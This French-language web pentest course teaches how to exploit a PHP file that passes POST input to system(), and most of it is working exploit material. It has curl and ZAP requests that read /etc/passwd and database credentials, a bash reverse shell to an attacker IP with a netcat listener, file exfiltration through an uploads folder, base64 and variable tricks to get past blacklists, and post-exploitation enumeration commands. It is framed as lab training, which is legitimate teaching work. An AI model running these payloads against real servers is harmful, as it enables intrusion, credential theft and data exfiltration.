# Cours : Pentest Web - Exploitation PHP et manipulation de requêtes HTTP

## Introduction

Cette section couvre l'**exploitation de code PHP vulnérable** permettant l'exécution de commandes système. Nous allons apprendre à :
- Analyser du code PHP pour identifier des vulnérabilités
- Manipuler des requêtes HTTP (GET → POST)
- Exploiter des fonctions dangereuses PHP (`system()`, `exec()`, `shell_exec()`)
- Utiliser ZAP et curl pour l'exploitation [zetcode](https://zetcode.com/php/getpostrequest/)

**⚠️ Important** : Ces techniques sont uniquement pour des environnements de lab autorisés.

***

## Partie 1 : Analyse du code PHP vulnérable

### 1.1 Exemple de code vulnérable

**Scénario** : Vous découvrez un fichier PHP sur le serveur cible.

```php
<?php
// Fichier : vulnerable.php

// Récupération du paramètre GET 'msg'
if (isset($_GET['msg'])) {
    echo $_GET['msg'];
}

// Récupération du paramètre POST 'cmd' (DANGER !)
if (isset($_POST['cmd'])) {
    system($_POST['cmd']);  // Exécution de commande système
}
?>
```

### 1.2 Analyse de la vulnérabilité

**Ligne par ligne** :

#### Partie GET - Echo simple

```php
if (isset($_GET['msg'])) {
    echo $_GET['msg'];
}
```

**Fonctionnement**  : [w3schools](https://www.w3schools.com/php/php_echo_print.asp)
- `$_GET['msg']` : Récupère le paramètre `msg` de l'URL
- `echo` : Affiche la valeur à l'écran
- **Vulnérabilité** : XSS (Cross-Site Scripting) si pas de sanitization

**Test GET** :
```
http://target.com/vulnerable.php?msg=hello
```

**Résultat** :
```
hello
```

**Exploitation XSS** (bonus) :
```
http://target.com/vulnerable.php?msg=<script>alert('XSS')</script>
```

#### Partie POST - Exécution système (CRITIQUE)

```php
if (isset($_POST['cmd'])) {
    system($_POST['cmd']);
}
```

**Fonctionnement**  : [php](https://www.php.net/manual/en/reserved.variables.post.php)
- `$_POST['cmd']` : Récupère le paramètre `cmd` envoyé en POST
- `system()` : **Exécute une commande système sur le serveur**
- **Vulnérabilité** : **RCE (Remote Code Execution)** - Contrôle total du serveur !

**Danger** : Un attaquant peut exécuter n'importe quelle commande :
- `ls` : Lister les fichiers
- `cat /etc/passwd` : Lire les utilisateurs
- `whoami` : Identifier l'utilisateur actuel
- `rm -rf /` : Détruire le système (ne JAMAIS faire)

***

## Partie 2 : Exploitation avec requête GET (test initial)

### 2.1 Test du paramètre GET 'msg'

**Objectif** : Vérifier le comportement du paramètre GET.

**Requête HTTP** :
```http
GET /vulnerable.php?msg=hello HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0
```

**Réponse** :
```http
HTTP/1.1 200 OK
Content-Type: text/html

hello
```

**Interprétation** : Le paramètre `msg` fonctionne en GET et affiche simplement le texte. [classes.engineering.wustl](https://classes.engineering.wustl.edu/cse330/index.php?title=PHP_Original)

### 2.2 Tentative d'exécution de commande en GET (échec attendu)

**Test naïf** :
```
http://target.com/vulnerable.php?cmd=whoami
```

**Résultat** : Aucun effet, car le code attend `$_POST['cmd']`, pas `$_GET['cmd']`. [tutorialspoint](https://www.tutorialspoint.com/php/php_get_post.htm)

**Conclusion** : Pour exploiter `system()`, il faut envoyer une **requête POST**.

***

## Partie 3 : Conversion GET → POST dans ZAP

### 3.1 Méthode 1 : Convertir directement la requête GET

**Workflow dans OWASP ZAP** :

#### Étape 1 : Intercepter la requête GET initiale

```
1. Dans ZAP, naviguer vers :
   http://target.com/vulnerable.php?msg=hello

2. Onglet "History" → Trouver la requête GET
3. Clic droit sur la requête → Open/Resend with Request Editor...
```

#### Étape 2 : Modifier la méthode en POST

**Requête GET originale** :
```http
GET /vulnerable.php?msg=hello HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0
```

**Modifications à effectuer** :

1. **Changer la méthode** : `GET` → `POST`
2. **Supprimer les paramètres de l'URL** : `?msg=hello` → vide
3. **Ajouter l'en-tête Content-Type**  : [php](https://www.php.net/manual/en/reserved.variables.post.php)
   ```
   Content-Type: application/x-www-form-urlencoded
   ```
4. **Déplacer les paramètres dans le body** :
   ```
   cmd=whoami
   ```

**Requête POST finale** :
```http
POST /vulnerable.php HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

cmd=whoami
```

#### Étape 3 : Envoyer la requête

```
1. Dans Request Editor, cliquer sur "Send"
2. Observer la réponse dans l'onglet "Response"
```

**Réponse attendue** :
```http
HTTP/1.1 200 OK
Content-Type: text/html

www-data
```

**Succès !** La commande `whoami` a été exécutée, retournant `www-data` (l'utilisateur du serveur web).

### 3.2 Méthode 2 : Créer une nouvelle requête POST manuellement

**Workflow** :

```
1. ZAP → Tools → Manual Request Editor
2. Configurer :
   - Method : POST
   - URL : http://target.com/vulnerable.php
   - Headers :
     Content-Type: application/x-www-form-urlencoded
   - Body :
     cmd=whoami

3. Send
```

***

## Partie 4 : Exploitation avec curl (ligne de commande)

### 4.1 Comprendre l'en-tête Content-Type

**Question** : D'où vient `Content-Type: application/x-www-form-urlencoded` ? [tutorialspoint](https://www.tutorialspoint.com/php/php_get_post.htm)

**Réponse** : C'est l'en-tête standard pour envoyer des données de formulaire en POST.

**Test avec curl en mode verbose** :
```bash
curl -v -X POST http://target.com/vulnerable.php -d "cmd=whoami"
```

**Sortie verbose** :
```http
> POST /vulnerable.php HTTP/1.1
> Host: target.com
> User-Agent: curl/7.68.0
> Accept: */*
> Content-Type: application/x-www-form-urlencoded  ← Ajouté automatiquement
> Content-Length: 10
>
< HTTP/1.1 200 OK
< Content-Type: text/html
<
www-data
```

**Observation** : curl ajoute automatiquement `Content-Type: application/x-www-form-urlencoded` quand on utilise `-d`. [zetcode](https://zetcode.com/php/getpostrequest/)

### 4.2 Exploitation basique avec curl

**Syntaxe générale** :
```bash
curl -X POST <URL> -d "<paramètre>=<valeur>"
```

**Exemple : Identifier l'utilisateur** :
```bash
curl -X POST http://target.com/vulnerable.php -d "cmd=whoami"
```

**Résultat** :
```
www-data
```

**Exemple : Lister les fichiers** :
```bash
curl -X POST http://target.com/vulnerable.php -d "cmd=ls"
```

**Résultat** :
```
index.html
vulnerable.php
config.php
uploads/
```

**Exemple : Lire un fichier sensible** :
```bash
curl -X POST http://target.com/vulnerable.php -d "cmd=cat /etc/passwd"
```

**Résultat** :
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
```

### 4.3 Exécution de commandes complexes

**Problème** : Les espaces et caractères spéciaux doivent être encodés.

**Solution 1 : Guillemets simples** :
```bash
curl -X POST http://target.com/vulnerable.php -d 'cmd=ls -la /var/www'
```

**Solution 2 : URL encoding** :
```bash
# "ls -la" devient "ls%20-la"
curl -X POST http://target.com/vulnerable.php -d "cmd=ls%20-la"
```

**Solution 3 : Encoding automatique avec --data-urlencode** :
```bash
curl -X POST http://target.com/vulnerable.php --data-urlencode "cmd=ls -la /var/www"
```

***

## Partie 5 : Exploitation complète dans ZAP

### 5.1 Séquence d'exploitation étape par étape

#### Étape 1 : Reconnaissance initiale

**Commande** : `ls` (lister le répertoire courant)

**Requête ZAP** :
```http
POST /vulnerable.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

cmd=ls
```

**Réponse** :
```
index.html
vulnerable.php
config.php
uploads/
```

#### Étape 2 : Identifier l'utilisateur

**Commande** : `whoami`

**Requête** :
```http
POST /vulnerable.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

cmd=whoami
```

**Réponse** :
```
www-data
```

#### Étape 3 : Localiser le répertoire actuel

**Commande** : `pwd` (print working directory)

**Requête** :
```http
POST /vulnerable.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

cmd=pwd
```

**Réponse** :
```
/var/www/html
```

#### Étape 4 : Rechercher des fichiers sensibles

**Commande** : `find / -name "config*" 2>/dev/null`

**Requête** :
```http
POST /vulnerable.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

cmd=find / -name "config*" 2>/dev/null
```

**Réponse** :
```
/var/www/html/config.php
/etc/mysql/my.cnf
```

#### Étape 5 : Lire des fichiers de configuration

**Commande** : `cat config.php`

**Requête** :
```http
POST /vulnerable.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

cmd=cat config.php
```

**Réponse** :
```php
<?php
$db_host = "localhost";
$db_user = "admin";
$db_pass = "SuperSecret123!";
$db_name = "webapp";
?>
```

**Succès !** Credentials de base de données récupérés.

### 5.2 Sauvegarder les résultats

**Dans ZAP** :
```
1. Pour chaque requête intéressante :
   - Clic droit → Flag as Note
   - OU : Clic droit → Add to Context → Report Items

2. Export final :
   - Report → Generate HTML Report
```

***

## Partie 6 : Escalade de l'exploitation

### 6.1 Obtenir un reverse shell

**Objectif** : Établir une connexion interactive avec le serveur. [zetcode](https://zetcode.com/php/getpostrequest/)

#### Préparation côté attaquant

```bash
# Démarrer un listener Netcat
nc -lvnp 4444

# -l : Listen
# -v : Verbose
# -n : No DNS resolution
# -p : Port
```

#### Envoyer le reverse shell via POST

**Commande** : Reverse shell bash
```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

**Requête ZAP** :
```http
POST /vulnerable.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

cmd=bash -i >& /dev/tcp/192.168.1.50/4444 0>&1
```

**⚠️ Attention** : Les caractères spéciaux (`>`, `&`) doivent être URL-encodés ou échappés.

**Alternative avec curl** :
```bash
curl -X POST http://target.com/vulnerable.php \
  --data-urlencode "cmd=bash -i >& /dev/tcp/192.168.1.50/4444 0>&1"
```

**Résultat côté attaquant** :
```bash
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 192.168.1.100 54321
www-data@target:/var/www/html$
```

**Shell interactif obtenu !**

### 6.2 Exfiltrer des données

**Commande** : Compresser et exfiltrer des fichiers sensibles

#### Étape 1 : Créer une archive

**Requête** :
```http
POST /vulnerable.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

cmd=tar czf /tmp/data.tar.gz /var/www/html/*.php
```

#### Étape 2 : Déplacer vers un répertoire accessible

**Requête** :
```http
POST /vulnerable.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

cmd=cp /tmp/data.tar.gz /var/www/html/uploads/backup.tar.gz
```

#### Étape 3 : Télécharger via le navigateur

```
http://target.com/uploads/backup.tar.gz
```

***

## Partie 7 : Autres fonctions PHP dangereuses

### 7.1 Fonctions d'exécution de commandes

| Fonction PHP | Comportement | Retour | Exemple |
|--------------|--------------|--------|---------|
| `system()` | Exécute et affiche la sortie | Dernière ligne | `system('ls');` |
| `exec()` | Exécute sans afficher | Dernière ligne | `$output = exec('whoami');` |
| `shell_exec()` | Exécute via shell | Sortie complète | `$output = shell_exec('ls');` |
| `passthru()` | Exécute et affiche binaire | Aucun | `passthru('cat image.jpg');` |
| `popen()` | Ouvre un processus | File pointer | `$handle = popen('ls', 'r');` |
| `proc_open()` | Ouvre un processus avancé | Resource | Complexe |
| Backticks `` `cmd` `` | Équivalent à shell_exec() | Sortie complète | ``$output = `whoami`;`` |

### 7.2 Exploitation avec exec()

**Code vulnérable** :
```php
<?php
if (isset($_POST['cmd'])) {
    $output = exec($_POST['cmd']);
    echo $output;  // Affiche uniquement la dernière ligne
}
?>
```

**Problème** : `exec()` ne retourne que la dernière ligne.

**Solution** : Utiliser le 2ème paramètre pour capturer toutes les lignes :
```php
<?php
if (isset($_POST['cmd'])) {
    exec($_POST['cmd'], $output);
    echo implode("\n", $output);
}
?>
```

**Exploitation** :
```http
POST /vulnerable.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

cmd=ls -la
```

### 7.3 Exploitation avec backticks

**Code vulnérable** :
```php
<?php
if (isset($_POST['cmd'])) {
    $output = `{$_POST['cmd']}`;  // Backticks
    echo $output;
}
?>
```

**Exploitation identique** :
```http
POST /vulnerable.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

cmd=whoami
```

***

## Partie 8 : Détection et contournement

### 8.1 Filtres de sécurité courants

**Blacklist de commandes** :
```php
<?php
$blacklist = ['ls', 'cat', 'whoami', 'passwd'];
if (in_array($_POST['cmd'], $blacklist)) {
    die("Command not allowed");
}
system($_POST['cmd']);
?>
```

**Contournement** :
```bash
# Au lieu de "ls"
cmd=/bin/ls
cmd=l\s
cmd=l$(echo)s

# Au lieu de "cat /etc/passwd"
cmd=cat /etc/pass*
cmd=cat /etc/pass$(echo)wd
```

### 8.2 Techniques d'obfuscation

**Encoding base64** :
```bash
# Encoder la commande
echo "cat /etc/passwd" | base64
# Résultat : Y2F0IC9ldGMvcGFzc3dkCg==

# Payload
cmd=echo Y2F0IC9ldGMvcGFzc3dkCg== | base64 -d | bash
```

**Variables d'environnement** :
```bash
cmd=e=cat;f=/etc/passwd;$e $f
```

***

## Partie 9 : Méthodologie complète d'exploitation RCE

### 9.1 Checklist d'exploitation

1. ✅ **Identifier la vulnérabilité** : Analyser le code PHP source
2. ✅ **Tester les paramètres GET** : Vérifier comportement initial
3. ✅ **Convertir GET → POST** : Utiliser ZAP Request Editor
4. ✅ **Ajouter Content-Type** : `application/x-www-form-urlencoded`
5. ✅ **Tester commandes basiques** : `whoami`, `pwd`, `ls`
6. ✅ **Énumérer le système** : `uname -a`, `cat /etc/passwd`
7. ✅ **Rechercher fichiers sensibles** : `find`, `grep`
8. ✅ **Établir un shell** : Reverse shell avec Netcat
9. ✅ **Escalade de privilèges** : SUID, sudo, kernel exploits
10. ✅ **Documenter** : Screenshots, commandes, résultats

### 9.2 Commandes essentielles post-exploitation

```bash
# Identifier le système
cmd=uname -a

# Vérifier les privilèges
cmd=id

# Lister utilisateurs
cmd=cat /etc/passwd

# Trouver fichiers SUID (escalade)
cmd=find / -perm -4000 2>/dev/null

# Vérifier permissions sudo
cmd=sudo -l

# Historique bash (credentials ?)
cmd=cat ~/.bash_history

# Processus en cours
cmd=ps aux

# Connexions réseau
cmd=netstat -tulpn
```

***

## Résumé : Points clés à retenir

1. **GET vs POST** : `$_GET` lit l'URL, `$_POST` lit le body de la requête [tutorialspoint](https://www.tutorialspoint.com/php/php_get_post.htm)
2. **Content-Type** : `application/x-www-form-urlencoded` est obligatoire pour POST form data [php](https://www.php.net/manual/en/reserved.variables.post.php)
3. **system()** : Fonction PHP dangereuse qui exécute des commandes système
4. **ZAP Request Editor** : Permet de convertir GET → POST facilement
5. **curl -d** : Ajoute automatiquement le Content-Type correct [zetcode](https://zetcode.com/php/getpostrequest/)
6. **RCE** : Remote Code Execution = vulnérabilité critique (contrôle total)
7. **Reverse shell** : Établir une connexion interactive pour contrôle complet
8. **Documentation** : Tout noter pour le rapport de pentest
